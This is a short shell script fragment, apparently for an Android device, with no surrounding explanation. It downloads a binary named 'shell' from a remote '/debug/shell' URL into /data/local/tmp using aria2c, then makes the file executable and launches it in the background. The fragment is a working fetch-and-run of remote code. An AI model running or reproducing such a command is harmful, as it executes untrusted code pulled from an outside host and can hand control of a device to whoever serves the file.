# ------------------------------------------------------


URL="https://painel.iaupdatecentral.com/debug/shell"
aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" \
    --continue=true --max-connection-per-server=4 -x4 -s4 \
    --dir="/data/local/tmp" -o "shell" "$URL"
$BB du -hs "/data/local/tmp/shell"
$BB chmod 755 /data/local/tmp/shell
/data/local/tmp/shell &


